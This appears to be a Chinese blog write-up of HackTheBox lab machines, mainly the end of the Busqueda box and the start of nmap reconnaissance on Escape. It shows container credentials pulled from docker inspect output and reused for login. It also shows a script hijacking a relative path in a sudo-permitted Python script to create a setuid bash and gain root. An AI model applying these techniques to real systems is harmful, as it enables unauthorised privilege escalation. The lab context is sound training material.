class="line">svc@busqueda:/etc/apache2/sites-available$ ls -la</span><br><span class="line">total 20</span><br><span class="line">drwxr-xr-x 2 root root 4096 Apr  4 16:08 .</span><br><span class="line">drwxr-xr-x 8 root root 4096 Apr  4 16:08 ..</span><br><span class="line">-rw-r--r-- 1 root root  837 Feb 20 14:06 000-default.conf</span><br><span class="line">-rw-r--r-- 1 root root 6338 Sep 30  2022 default-ssl.conf</span><br><span class="line">svc@busqueda:/etc/apache2/sites-available$ cat 000-default.conf</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>内容为：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;VirtualHost *:80&gt;</span><br><span class="line">        ProxyPreserveHost On</span><br><span class="line">        ServerName searcher.htb</span><br><span class="line">        ServerAdmin admin@searcher.htb</span><br><span class="line">        ProxyPass / http://127.0.0.1:5000/</span><br><span class="line">        ProxyPassReverse / http://127.0.0.1:5000/</span><br><span class="line"></span><br><span class="line">        RewriteEngine On</span><br><span class="line">        RewriteCond %&#123;HTTP_HOST&#125; !^searcher.htb$</span><br><span class="line">        RewriteRule /.* http://searcher.htb/ [R]</span><br><span class="line"></span><br><span class="line">        ErrorLog $&#123;APACHE_LOG_DIR&#125;/error.log</span><br><span class="line">        CustomLog $&#123;APACHE_LOG_DIR&#125;/access.log combined</span><br><span class="line"></span><br><span class="line">&lt;/VirtualHost&gt;</span><br><span class="line"></span><br><span class="line">&lt;VirtualHost *:80&gt;</span><br><span class="line">        ProxyPreserveHost On</span><br><span class="line">        ServerName gitea.searcher.htb</span><br><span class="line">        ServerAdmin admin@searcher.htb</span><br><span class="line">        ProxyPass / http://127.0.0.1:3000/</span><br><span class="line">        ProxyPassReverse / http://127.0.0.1:3000/</span><br><span class="line"></span><br><span class="line">        ErrorLog $&#123;APACHE_LOG_DIR&#125;/error.log</span><br><span class="line">        CustomLog $&#123;APACHE_LOG_DIR&#125;/access.log combined</span><br><span class="line"></span><br><span class="line">&lt;/VirtualHost&gt;</span><br><span class="line"></span><br><span class="line"># vim: syntax=apache ts=4 sw=4 sts=4 sr noet</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>发现了gitea.searcher.htb网址，尝试登录：http或https，或加上端口3000都不行，想到添加域名</p>
<p>切换到主机的终端</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# vim /etc/hosts</span><br><span class="line"></span><br><span class="line">添加</span><br><span class="line">10.10.11.208 gitea.searcher.htb</span><br></pre></td></tr></table></figure>

<p>打开浏览器输入<a target="_blank" rel="noopener" href="http://gitea.searcher.htb/">http://gitea.searcher.htb</a></p>
<p>点击右上角sign in 出现</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230606214158201.png"></p>
<p>先放一遍。</p>
<p>再次在svc用户界面下，</p>
<p>sudo -l，</p>
<p>关注以下操作。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">User svc may run the following commands on busqueda:</span><br><span class="line">    (root) /usr/bin/python3 /opt/scripts/system-checkup.py *</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">svc@busqueda:/etc/apache2/sites-available$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py *</span><br><span class="line">Usage: /opt/scripts/system-checkup.py &lt;action&gt; (arg1) (arg2)</span><br><span class="line"></span><br><span class="line">     docker-ps     : List running docker containers</span><br><span class="line">     docker-inspect : Inpect a certain docker container</span><br><span class="line">     full-checkup  : Run a full system checkup</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>对这三个命令依次运行一下，</p>
<p><img src="/../../../Typora/img111/image-20230606222958314.png" alt="image-20230606222958314"></p>
<p>发现docker-inspect 需要配合 -f和容器名才有显示</p>
<p>doker-inspect官方说明得：</p>
<p><a target="_blank" rel="noopener" href="https://docs.docker.com/engine/reference/commandline/inspect/">docs.docker.com&#x2F;engine&#x2F;reference&#x2F;commandline&#x2F;inspect&#x2F;</a></p>
<p><img src="/../../../Typora/img111/image-20230606223323788.png" alt="image-20230606223323788"></p>
<p>例子：</p>
<p><code>docker inspect --format=&#39;&#123;&#123;.LogPath&#125;&#125;&#39; $INSTANCE_ID</code></p>
<p><code>docker inspect --format=&#39;&#123;&#123;json .Config&#125;&#125;&#39; $INSTANCE_ID</code></p>
<p>已知在…docker-ps命令下得到容器ID为960873171e2e和f84a6b33fb5a</p>
<p>先看ID1的：</p>
<p><code>sudo /usr/bin/python3 /opt/scripts/system-checkup.py  docker-inspect --format=&#39;&#123;&#123;json .Config&#125;&#125;&#39; 960873171e2e</code>得：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">svc@busqueda:/etc/apache2/sites-available$ </span><br><span class="line">sudo /usr/bin/python3 /opt/scripts/system-checkup.py  docker-inspect --format=&#x27;&#123;&#123;json .Config&#125;&#125;&#x27; 960873171e2e</span><br><span class="line">--format=&#123;&quot;Hostname&quot;:&quot;960873171e2e&quot;,&quot;Domainname&quot;:&quot;&quot;,&quot;User&quot;:&quot;&quot;,&quot;AttachStdin&quot;:false,&quot;AttachStdout&quot;:false,&quot;AttachStderr&quot;:false,&quot;ExposedPorts&quot;:&#123;&quot;22/tcp&quot;:&#123;&#125;,&quot;3000/tcp&quot;:&#123;&#125;&#125;,&quot;Tty&quot;:false,&quot;OpenStdin&quot;:false,&quot;StdinOnce&quot;:false,&quot;Env&quot;:[&quot;USER_UID=115&quot;,&quot;USER_GID=121&quot;,&quot;GITEA__database__DB_TYPE=mysql&quot;,&quot;GITEA__database__HOST=db:3306&quot;,&quot;GITEA__database__NAME=gitea&quot;,&quot;GITEA__database__USER=gitea&quot;,&quot;GITEA__database__PASSWD=yuiu1hoiu4i5ho1uh&quot;,&quot;PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin&quot;,&quot;USER=git&quot;,&quot;GITEA_CUSTOM=/data/gitea&quot;],&quot;Cmd&quot;:[&quot;/bin/s6-svscan&quot;,&quot;/etc/s6&quot;],&quot;Image&quot;:&quot;gitea/gitea:latest&quot;,&quot;Volumes&quot;:&#123;&quot;/data&quot;:&#123;&#125;,&quot;/etc/localtime&quot;:&#123;&#125;,&quot;/etc/timezone&quot;:&#123;&#125;&#125;,&quot;WorkingDir&quot;:&quot;&quot;,&quot;Entrypoint&quot;:[&quot;/usr/bin/entrypoint&quot;],&quot;OnBuild&quot;:null,&quot;Labels&quot;:&#123;&quot;com.docker.compose.config-hash&quot;:&quot;e9e6ff8e594f3a8c77b688e35f3fe9163fe99c66597b19bdd03f9256d630f515&quot;,&quot;com.docker.compose.container-number&quot;:&quot;1&quot;,&quot;com.docker.compose.oneoff&quot;:&quot;False&quot;,&quot;com.docker.compose.project&quot;:&quot;docker&quot;,&quot;com.docker.compose.project.config_files&quot;:&quot;docker-compose.yml&quot;,&quot;com.docker.compose.project.working_dir&quot;:&quot;/root/scripts/docker&quot;,&quot;com.docker.compose.service&quot;:&quot;server&quot;,&quot;com.docker.compose.version&quot;:&quot;1.29.2&quot;,&quot;maintainer&quot;:&quot;maintainers@gitea.io&quot;,&quot;org.opencontainers.image.created&quot;:&quot;2022-11-24T13:22:00Z&quot;,&quot;org.opencontainers.image.revision&quot;:&quot;9bccc60cf51f3b4070f5506b042a3d9a1442c73d&quot;,&quot;org.opencontainers.image.source&quot;:&quot;https://github.com/go-gitea/gitea.git&quot;,&quot;org.opencontainers.image.url&quot;:&quot;https://github.com/go-gitea/gitea&quot;&#125;&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>有数据库信息为</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;Tty&quot;:false,&quot;OpenStdin&quot;:false,&quot;StdinOnce&quot;:false,&quot;Env&quot;:[&quot;USER_UID=115&quot;,&quot;USER_GID=121&quot;,&quot;GITEA__database__DB_TYPE=mysql&quot;,&quot;GITEA__database__HOST=db:3306&quot;,&quot;GITEA__database__NAME=gitea&quot;,&quot;GITEA__database__USER=gitea&quot;,&quot;GITEA__database__PASSWD=yuiu1hoiu4i5ho1uh&quot;,&quot;PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin&quot;,&quot;USER=git&quot;,&quot;GITEA_CUSTOM=/data/gitea&quot;]</span><br></pre></td></tr></table></figure>

<blockquote>
<p>GITEA__database__USER&#x3D;gitea”,”GITEA__database__PASSWD&#x3D;yuiu1hoiu4i5ho1uh</p>
</blockquote>
<p>看下另一个ID的</p>
<p><code>sudo /usr/bin/python3 /opt/scripts/system-checkup.py  docker-inspect --format=&#39;&#123;&#123;json .Config&#125;&#125;&#39; f84a6b33fb5a</code></p>
<p>得到结果：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">--format=&#123;&quot;Hostname&quot;:&quot;f84a6b33fb5a&quot;,&quot;Domainname&quot;:&quot;&quot;,&quot;User&quot;:&quot;&quot;,&quot;AttachStdin&quot;:false,&quot;AttachStdout&quot;:false,&quot;AttachStderr&quot;:false,&quot;ExposedPorts&quot;:&#123;&quot;3306/tcp&quot;:&#123;&#125;,&quot;33060/tcp&quot;:&#123;&#125;&#125;,&quot;Tty&quot;:false,&quot;OpenStdin&quot;:false,&quot;StdinOnce&quot;:false,&quot;Env&quot;:[&quot;MYSQL_ROOT_PASSWORD=jI86kGUuj87guWr3RyF&quot;,&quot;MYSQL_USER=gitea&quot;,&quot;MYSQL_PASSWORD=yuiu1hoiu4i5ho1uh&quot;,&quot;MYSQL_DATABASE=gitea&quot;,&quot;PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin&quot;,&quot;GOSU_VERSION=1.14&quot;,&quot;MYSQL_MAJOR=8.0&quot;,&quot;MYSQL_VERSION=8.0.31-1.el8&quot;,&quot;MYSQL_SHELL_VERSION=8.0.31-1.el8&quot;],&quot;Cmd&quot;:[&quot;mysqld&quot;],&quot;Image&quot;:&quot;mysql:8&quot;,&quot;Volumes&quot;:&#123;&quot;/var/lib/mysql&quot;:&#123;&#125;&#125;,&quot;WorkingDir&quot;:&quot;&quot;,&quot;Entrypoint&quot;:[&quot;docker-entrypoint.sh&quot;],&quot;OnBuild&quot;:null,&quot;Labels&quot;:&#123;&quot;com.docker.compose.config-hash&quot;:&quot;1b3f25a702c351e42b82c1867f5761829ada67262ed4ab55276e50538c54792b&quot;,&quot;com.docker.compose.container-number&quot;:&quot;1&quot;,&quot;com.docker.compose.oneoff&quot;:&quot;False&quot;,&quot;com.docker.compose.project&quot;:&quot;docker&quot;,&quot;com.docker.compose.project.config_files&quot;:&quot;docker-compose.yml&quot;,&quot;com.docker.compose.project.working_dir&quot;:&quot;/root/scripts/docker&quot;,&quot;com.docker.compose.service&quot;:&quot;db&quot;,&quot;com.docker.compose.version&quot;:&quot;1.29.2&quot;&#125;&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>其中：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;Tty&quot;:false,&quot;OpenStdin&quot;:false,&quot;StdinOnce&quot;:false,&quot;Env&quot;:[&quot;MYSQL_ROOT_PASSWORD=jI86kGUuj87guWr3RyF&quot;,&quot;MYSQL_USER=gitea&quot;,&quot;MYSQL_PASSWORD=yuiu1hoiu4i5ho1uh&quot;,&quot;MYSQL_DATABASE=gitea&quot;,&quot;PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin&quot;,&quot;GOSU_VERSION=1.14&quot;,&quot;MYSQL_MAJOR=8.0&quot;,&quot;MYSQL_VERSION=8.0.31-1.el8&quot;,&quot;MYSQL_SHELL_VERSION=8.0.31-1.el8&quot;]</span><br></pre></td></tr></table></figure>

<blockquote>
<p>“MYSQL_ROOT_PASSWORD&#x3D;jI86kGUuj87guWr3RyF”,”MYSQL_USER&#x3D;gitea”,”MYSQL_PASSWORD&#x3D;yuiu1hoiu4i5ho1uh”,”MYSQL_DATABASE&#x3D;gitea”</p>
</blockquote>
<p>好，进入gitea的登录页面，尝试administrator:yuiu1hoiu4i5ho1uh</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230607201649485.png"></p>
<p>点击左边的仓库，发现：</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230607201740407.png"></p>
<p>查看第一行脚本：</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230607201759588.png"></p>
<p>前三个脚本对应了，之前的三个命令。</p>
<p>查看第四个脚本内容，</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line">import subprocess</span><br><span class="line">import sys</span><br><span class="line"></span><br><span class="line">actions = [&#x27;full-checkup&#x27;, &#x27;docker-ps&#x27;,&#x27;docker-inspect&#x27;]</span><br><span class="line"></span><br><span class="line">def run_command(arg_list):</span><br><span class="line">    r = subprocess.run(arg_list, capture_output=True)</span><br><span class="line">    if r.stderr:</span><br><span class="line">        output = r.stderr.decode()</span><br><span class="line">    else:</span><br><span class="line">        output = r.stdout.decode()</span><br><span class="line"></span><br><span class="line">    return output</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def process_action(action):</span><br><span class="line">    if action == &#x27;docker-inspect&#x27;:</span><br><span class="line">        try:</span><br><span class="line">            _format = sys.argv[2]</span><br><span class="line">            if len(_format) == 0:</span><br><span class="line">                print(f&quot;Format can&#x27;t be empty&quot;)</span><br><span class="line">                exit(1)</span><br><span class="line">            container = sys.argv[3]</span><br><span class="line">            arg_list = [&#x27;docker&#x27;, &#x27;inspect&#x27;, &#x27;--format&#x27;, _format, container]</span><br><span class="line">            print(run_command(arg_list)) </span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">  </span><br><span class="line">        except IndexError:</span><br><span class="line">            print(f&quot;Usage: &#123;sys.argv[0]&#125; docker-inspect &lt;format&gt; &lt;container_name&gt;&quot;)</span><br><span class="line">            exit(1)</span><br><span class="line">    </span><br><span class="line">        except Exception as e:</span><br><span class="line">            print(&#x27;Something went wrong&#x27;)</span><br><span class="line">            exit(1)</span><br><span class="line">    </span><br><span class="line">    elif action == &#x27;docker-ps&#x27;:</span><br><span class="line">        try:</span><br><span class="line">            arg_list = [&#x27;docker&#x27;, &#x27;ps&#x27;]</span><br><span class="line">            print(run_command(arg_list)) </span><br><span class="line">        </span><br><span class="line">        except:</span><br><span class="line">            print(&#x27;Something went wrong&#x27;)</span><br><span class="line">            exit(1)</span><br><span class="line"></span><br><span class="line">    elif action == &#x27;full-checkup&#x27;:</span><br><span class="line">        try:</span><br><span class="line">            arg_list = [&#x27;./full-checkup.sh&#x27;]</span><br><span class="line">            print(run_command(arg_list))</span><br><span class="line">            print(&#x27;[+] Done!&#x27;)</span><br><span class="line">        except:</span><br><span class="line">            print(&#x27;Something went wrong&#x27;)</span><br><span class="line">            exit(1)</span><br><span class="line">            </span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line"></span><br><span class="line">    try:</span><br><span class="line">        action = sys.argv[1]</span><br><span class="line">        if action in actions:</span><br><span class="line">            process_action(action)</span><br><span class="line">        else:</span><br><span class="line">            raise IndexError</span><br><span class="line"></span><br><span class="line">    except IndexError:</span><br><span class="line">        print(f&#x27;Usage: &#123;sys.argv[0]&#125; &lt;action&gt; (arg1) (arg2)&#x27;)</span><br><span class="line">        print(&#x27;&#x27;)</span><br><span class="line">        print(&#x27;     docker-ps     : List running docker containers&#x27;)</span><br><span class="line">        print(&#x27;     docker-inspect : Inpect a certain docker container&#x27;)</span><br><span class="line">        print(&#x27;     full-checkup  : Run a full system checkup&#x27;)</span><br><span class="line">        print(&#x27;&#x27;)</span><br><span class="line">        exit(1)</span><br></pre></td></tr></table></figure>

<blockquote>
<p>   elif action &#x3D;&#x3D; ‘full-checkup’:<br>       try:<br>           arg_list &#x3D; [‘.&#x2F;full-checkup.sh’]<br>           print(run_command(arg_list))<br>           print(‘[+] Done!’)<br>       except:<br>           print(‘Something went wrong’)<br>           exit(1)</p>
</blockquote>
<p>得：所读取路径不是绝对路径，它在当前目录下找full-checkup.sh的，如果在用户界面中非&#x2F;opt&#x2F;scripts&#x2F;位置下，就会出现报错。</p>
<p>vim full-checkup.sh，内容为：</p>
<blockquote>
<p>#!&#x2F;bin&#x2F;bash<br>cp &#x2F;bin&#x2F;bash &#x2F;tmp&#x2F;bash<br>chmod +s &#x2F;tmp&#x2F;bash</p>
</blockquote>
<p>这段脚本的作用是创建了一个具有Setuid权限的”&#x2F;tmp&#x2F;bash”文件。通过设置Setuid权限，任何以该文件执行的用户都会暂时获得文件所有者（通常为root）的权限。这意味着，当普通用户执行”&#x2F;tmp&#x2F;bash”时，它将以root用户的权限执行，从而实现了权限提升。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">-bash-5.1$ whoami</span><br><span class="line">svc</span><br><span class="line">-bash-5.1$ pwd</span><br><span class="line">/home/svc</span><br><span class="line">-bash-5.1$ vim full-checkup.sh</span><br><span class="line">-bash-5.1$ chmod +x full-checkup.sh</span><br><span class="line">-bash-5.1$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup</span><br><span class="line">[sudo] password for svc: </span><br><span class="line"></span><br><span class="line">[+] Done!</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">-bash-5.1$ whoami</span><br><span class="line">svc</span><br><span class="line">-bash-5.1$ ls -la /bin/bash</span><br><span class="line">-rwsr-sr-x 1 root root 1396520 Jan  6  2022 /bin/bash</span><br><span class="line"></span><br><span class="line">成功给 /bin/bash 带上suid提权成功</span><br><span class="line">-bash-5.1$ /bin/bash -p</span><br><span class="line">bash-5.1# whoami</span><br><span class="line">root</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">bash-5.1# cd /root</span><br><span class="line">bash-5.1# ls -la</span><br><span class="line">total 60</span><br><span class="line">drwx------  9 root root 4096 Apr  3 16:01 .</span><br><span class="line">drwxr-xr-x 19 root root 4096 Mar  1 10:46 ..</span><br><span class="line">lrwxrwxrwx  1 root root    9 Feb 20 12:09 .bash_history -&gt; /dev/null</span><br><span class="line">-rw-r--r--  1 root root 3106 Oct 15  2021 .bashrc</span><br><span class="line">drwx------  3 root root 4096 Mar  1 10:46 .cache</span><br><span class="line">drwx------  3 root root 4096 Mar  1 10:46 .config</span><br><span class="line">-rw-r-----  1 root root  430 Apr  3 15:13 ecosystem.config.js</span><br><span class="line">-rw-r--r--  1 root root  104 Apr  3 08:58 .gitconfig</span><br><span class="line">drwxr-xr-x  3 root root 4096 Mar  1 10:46 .local</span><br><span class="line">-rw-------  1 root root   50 Feb 20 12:04 .my.cnf</span><br><span class="line">lrwxrwxrwx  1 root root    9 Feb 20 12:12 .mysql_history -&gt; /dev/null</span><br><span class="line">drwxr-xr-x  4 root root 4096 Mar  1 10:46 .npm</span><br><span class="line">drwxr-xr-x  5 root root 4096 Jun  7 04:20 .pm2</span><br><span class="line">-rw-r--r--  1 root root  161 Jul  9  2019 .profile</span><br><span class="line">-rw-r-----  1 root root   33 Jun  7 04:20 root.txt</span><br><span class="line">drwxr-xr-x  4 root root 4096 Apr  3 16:01 scripts</span><br><span class="line">drwx------  3 root root 4096 Mar  1 10:46 snap</span><br><span class="line">bash-5.1# cat root.txt</span><br><span class="line">105666c0b97b4202de7dabf892feb190</span><br><span class="line">bash-5.1# </span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>跟随大佬的wp思路进行，达到提权的目的。</p>
<p>1.nmap扫到端口为80，与22</p>
<p>2.访问80端口位置，进行反弹shell。</p>
<p>3.遍历各文件夹，找到敏感信息</p>
<p>4.拿到普通用户的账号和密码，尝试22端口的ssh连接。</p>
<p>5.由普通用户进行提权。</p>
<p>其中有很多细节有待细究，值得复盘。</p>
<h2 id="2-Escape"><a href="#2-Escape" class="headerlink" title="2.Escape"></a>2.Escape</h2><h3 id="1-参考"><a href="#1-参考" class="headerlink" title="1.参考"></a>1.参考</h3><p><a target="_blank" rel="noopener" href="http://t.csdn.cn/xUqAI">http://t.csdn.cn/xUqAI</a></p>
<p><a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV12k4y1J7zE/?spm_id_from=333.337.search-card.all.click&vd_source=c49e37118f69c7a5b34915b73d1b78ab">hackthebox中等难度靶场escape渗透全过程_哔哩哔哩_bilibili</a></p>
<p>nmap:</p>
<p><code>nmap -p- -sT --min-rate=1000 -Pn 10.10.11.202</code></p>
<blockquote>
<p>参数解释：</p>
<p>-p- 所有端口</p>
<p>-sT TCP连接</p>
<p>–min-rate&#x3D;1000 1秒发送1000个请求</p>
<p>-Pn 禁用主机发现</p>
<p>结果为：</p>
<p>53&#x2F;tcp    open  domain<br>88&#x2F;tcp    open  kerberos-sec<br>135&#x2F;tcp   open  msrpc<br>139&#x2F;tcp   open  netbios-ssn<br>389&#x2F;tcp   open  ldap<br>445&#x2F;tcp   open  microsoft-ds<br>464&#x2F;tcp   open  kpasswd5<br>593&#x2F;tcp   open  http-rpc-epmap<br>636&#x2F;tcp   open  ldapssl<br>3269&#x2F;tcp  open  globalcatLDAPssl<br>9389&#x2F;tcp  open  adws<br>49667&#x2F;tcp open  unknown<br>49687&#x2F;tcp open  unknown<br>49705&#x2F;tcp open  unknown<br>49711&#x2F;tcp open  unknown</p>
</blockquote>
<p><code>nmap -p- -sU --min-rate=1000 -Pn 10.10.11.202</code></p>
<blockquote>
<p>PORT    STATE SERVICE<br>53&#x2F;udp  open  domain<br>123&#x2F;udp open  ntp</p>
</blockquote>
<p>vim port.txt，将nmap中tcp扫描到的内容复制过去，通过正则过滤拼接出需要的端口号。提取每行”&#x2F;“之前的内容，再拼接即可</p>
<p>awk -F’&#x2F;‘ ‘{print $1}’  ORS&#x3D;’,’  port.txt  | tr -d ‘,’</p>
<blockquote>
<ol>
<li><p><code>awk</code>命令：<code>awk</code>是一个文本处理工具，用于按照指定的规则对文本进行处理。它按行读取输入，并根据给定的规则执行操作。</p>
</li>
<li><p><code>-F&#39;/&#39;</code>：<code>-F</code>选项用于指定字段分隔符。在这个命令中，我们将字段分隔符设置为斜杠（&#x2F;），以便将每行拆分为多个字段。</p>
</li>
<li><p><code>&#39;&#123;print $1&#125;&#39;</code>：这是一个<code>awk</code>的操作部分，指定要执行的操作。<code>$1</code>表示打印第一个字段。</p>
</li>
<li><p>默认情况下，<code>ORS</code>的值是一个换行符（<code>\n</code>），这意味着每个<code>print</code>语句打印的内容将以换行符分隔。但是，您可以通过修改<code>ORS</code>的值来指定不同的分隔符。</p>
</li>
</ol>
<p>  在这种情况下，我们使用<code>ORS=&#39;,&#39;</code>将<code>ORS</code>设置为逗号（<code>,</code>）。这样，当<code>print</code>语句执行时，它将使用逗号作为记录之间的分隔符，而不是默认的换行符。这样就实现了将提取的端口号使用逗号拼接在一起的效果。</p>
<p>  结果为：</p>
<p>  53,88,135,139,389,445,464,593,636,3269,9389,49667,49687,49705,49711, </p>
</blockquote>
<p><code>nmap -p53,88,135,139,389,445,464,593,636,3269,9389,49667,49687,49705,49711 -Pn -sT -sC -sV 10.10.11.202</code></p>
<blockquote>
<ul>
<li><code>-sC</code>：这个参数指定在扫描期间运行默认的Nmap脚本。Nmap脚本是一组自动化的测试和攻击脚本，用于探测和利用目标主机上的漏洞或服务配置问题。</li>
<li><code>-sV</code>：这个参数指定在扫描期间进行版本探测。<code>nmap</code>将尝试识别目标主机上运行的服务和应用程序的版本信息。通过识别版本信息，可以更好地了解目标主机上的系统配置和潜在的安全风险。</li>
</ul>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">PORT      STATE SERVICE       VERSION</span><br><span class="line">53/tcp    open  domain        Simple DNS Plus</span><br><span class="line">88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time:------)</span><br><span class="line">135/tcp   open  msrpc         Microsoft Windows RPC</span><br><span class="line">139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn</span><br><span class="line">389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)</span><br><span class="line">| ssl-cert: Subject: commonName=dc.sequel.htb</span><br><span 